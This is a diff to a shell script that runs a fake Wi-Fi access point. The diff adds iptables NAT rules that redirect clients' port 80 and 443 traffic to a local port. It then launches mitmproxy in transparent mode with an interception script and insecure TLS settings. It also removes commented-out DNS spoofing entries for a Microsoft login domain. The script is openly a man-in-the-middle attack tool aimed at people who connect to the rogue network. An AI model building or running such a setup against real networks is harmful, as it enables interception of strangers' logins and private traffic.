@@ -47,9 +47,6 @@ server=8.8.8.8
 log-queries
 log-dhcp
 listen-address=$GATEWAY
-#address=/login.microsoftonline.com/192.168.1.1
-#address=/http://httpforever.com/34.223.124.45
-#address=/login.microsoftonline.com/18.189.141.217
 EOF
 
 # Create three terminal windows
@@ -70,10 +67,15 @@ gnome-terminal -- bash -c "
 # Terminal 3: Configure iptables and enable IP forwarding
 gnome-terminal -- bash -c "
     echo 'Setting up iptables and enabling IP forwarding...';
-    iptables --table nat --append POSTROUTING --out-interface $ETH_INTERFACE -j MASQUERADE;
-    iptables --append FORWARD --in-interface $MONITOR_INTERFACE -j ACCEPT;
-    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward;
+    iptables -t nat -A POSTROUTING -o $ETH_INTERFACE -j MASQUERADE;
+    iptables -A FORWARD -i $MONITOR_INTERFACE -j ACCEPT;
+    echo 1 > /proc/sys/net/ipv4/ip_forward;
+    
+    iptables -t nat -A POSTROUTING -o $MONITOR_INTERFACE -j MASQUERADE;
+    iptables -t nat -A PREROUTING -i $MONITOR_INTERFACE  -p tcp --dport 443 -j REDIRECT --to-port 8080;
+    iptables -t nat -A PREROUTING -i $MONITOR_INTERFACE -p tcp --dport 80 -j REDIRECT --to-port 8080;
+    mitmproxy -s intercept.py --ssl-insecure --mode transparent
     exec bash
 "
-
+ 
 echo "All terminals have been set up. Fake access point is running."
